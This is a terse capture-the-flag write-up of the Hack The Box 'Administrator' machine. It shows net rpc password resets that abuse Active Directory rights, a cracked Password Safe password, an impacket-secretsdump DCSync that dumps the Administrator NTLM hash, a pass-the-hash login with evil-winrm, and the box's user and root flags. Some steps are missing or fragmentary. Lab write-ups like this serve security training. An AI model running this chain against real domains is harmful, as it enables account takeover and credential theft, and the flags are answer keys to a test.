# Administrator HTB

As is common in real life Windows pentests, you will start the Administrator box with credentials for the following account: Username: Olivia Password: ichliebedich

## Enumeration

Olivia has "genericAll" over michael

```bash
net rpc password "michael" 'Test123!' -U "administrator.htb"/"olivia"%"ichliebedich" -S "10.129.69.25"
```
And michael has the "forceChangePassword" over benjamin

``` bash
net rpc password "benjamin" 'Test123!' -U "administrator.htb"/"michael"%'Test123!' -S "10.129.69.25"
```

## Intrusion

tekieromucho     (Backu)
Backup.psafe3

```bash
*Evil-WinRM* PS C:\Users\emily\Documents> type ..\Desktop\user.txt
1feb43c02d4dcc761689db202bc5c16f
```

## Privilege Escalation

Getting information about bloodhound

```bash
❯ impacket-secretsdump  'administrator.htb'/'ethan':'limpbizkit'@10.129.69.25
Impacket v0.11.0 - Copyright 2023 Fortra

[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:3dc553ce4b9fd20bd016e098d2d2fd2e:::


❯ evil-winrm -i 10.129.69.25 -u Administrator -H 3dc553ce4b9fd20bd016e098d2d2fd2e                   
Evil-WinRM shell v3.5                     
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
administrator\administrator
*Evil-WinRM* PS C:\Users\Administrator\Documents> type C:\Users\Administrator\Desktop\root.txt
1e64f47889f1ed2f01916ad32adf5474
*Evil-WinRM* PS C:\Users\Administrator\Documents> 

```


Due to ethan, has DCSYNC to get the secretsdump from the administrator

